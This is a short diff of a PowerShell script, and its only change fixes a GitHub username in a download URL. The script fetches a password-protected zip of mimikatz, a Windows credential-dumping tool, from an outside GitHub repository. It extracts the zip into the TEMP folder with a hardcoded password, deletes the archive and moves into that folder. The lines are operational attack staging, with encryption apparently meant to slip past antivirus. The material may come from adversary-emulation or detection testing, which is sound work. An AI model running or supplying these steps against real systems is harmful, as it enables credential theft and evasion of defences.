@@ -1,4 +1,4 @@
-Invoke-WebRequest "https://github.com/crjptpp/tools_public/raw/main/enc_mimikatz.zip" -OutFile $env:TEMP\enc_mimikatz.zip
+Invoke-WebRequest "https://github.com/crjtpp/tools_public/raw/main/enc_mimikatz.zip" -OutFile $env:TEMP\enc_mimikatz.zip
 cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\enc_mimikatz.zip'
 Remove-Item $env:TEMP\enc_mimikatz.zip
 cd $env:TEMP
